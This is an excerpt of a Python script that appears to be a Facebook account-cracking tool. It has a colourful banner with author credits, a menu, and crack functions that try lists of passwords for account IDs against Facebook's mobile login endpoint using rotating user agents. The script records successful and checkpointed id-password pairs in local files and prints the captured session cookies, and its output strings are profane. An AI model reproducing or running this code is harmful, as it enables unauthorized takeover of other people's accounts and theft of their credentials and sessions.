...
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Vivaldi/6.1.3035.111",]
...
def back():
    login()
def contact():
   # os.system('xdg-open #https://www.facebook.com/Fuck.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[0;92m
\033[38;5;196m$$$$$$$$\  $$$$$$\  $$\   $$\        $$$$$$\    $$\   
\033[35;1m$$  _____|$$  __$$\ $$ |  $$ |      $$$ __$$\ $$$$ |  
$$ |      $$ /  $$ |\$$\ $$  |      $$$$\ $$ |\_$$ |  
\033[36;1m$$$$$\    $$ |  $$ | \$$$$  /       $$\$$\$$ |  $$ |  
$$  __|   $$ |  $$ | $$  $$<        $$ \$$$$ |  $$ |  
\033[36;1m$$ |      $$ |  $$ |$$  /\$$\       $$ |\$$$ |  $$ |  
\033[38;5;196m$$ |       $$$$$$  |$$ /  $$ |      \$$$$$$  /$$$$$$\ 
\033[34;1m\__|       \______/ \__|  \__|       \______/ \______|  
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m  \033[0;92m
\033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
\033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[92m\n\033[1;32m(•) \033[1;33mCREATED BY   \033[1;32m :  \033[1;36mAHAMEED-ALIF    \n\033[1;32m(•) \033[1;33mFACEBOK     \033[1;32m  : \033[1;36m D9DE.PRO         \n\033[1;32m(•)\033[1;33m GITHUB        : \033[1;36m itzALIF007 \n\033[95m(•)  𝚠𝚒𝚕𝚕 𝚄𝚙𝚍𝚊𝚝𝚎𝚍 𝙴𝚟𝚎𝚛𝚢 3 𝙳𝚊ys   
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
os.system('clear')
print(logo)
#os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
#os.system('espeak -a 300 " Welcome,   to,  Fuck,  King,  Tools"')
pass
...
def menu():
    ...
    if Fuck in ['111']:
      ...
      os.system('xdg-open m.facebook.com/d9de.pro')
        #os.system("python tt2.py")
    elif Fuck in ['3','03']:
        result()
    elif Fuck in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[D9DE•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Fuck-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Fuck-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Fuck,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Fuck-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Fuck-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Fuck-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Fuck,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
